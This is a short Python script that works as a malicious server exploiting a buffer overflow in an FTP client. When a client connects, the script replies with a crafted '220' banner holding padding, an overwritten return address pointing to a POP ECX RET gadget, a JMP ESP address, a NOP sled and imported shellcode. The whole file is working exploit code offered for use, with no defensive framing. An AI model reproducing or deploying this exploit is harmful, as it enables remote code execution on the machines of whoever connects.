import socket
from payload import buf

import struct
def shell_attack(target_machine, target_port):
    eip=struct.pack('<L',0x68084A6F)    #POP ECX RET 
    jmpesp=struct.pack('<L',0x68017296) #JMP ESP
    #We will do POP ECX RET and place a JMP ESP address at the RET address that will jump to shellcode.
    payload="A"*2061+eip+jmpesp+"\x90"*10+buf+"\x90"*20     #Server Ready '220' Exploit
    port = target_port                 
    s = socket.socket()
    host = target_machine              
    s.bind((host, port))            
    s.listen(5)                    
    while True:
        conn, addr = s.accept()     
        conn.send('220'+payload+'\r\n')
        conn.close()





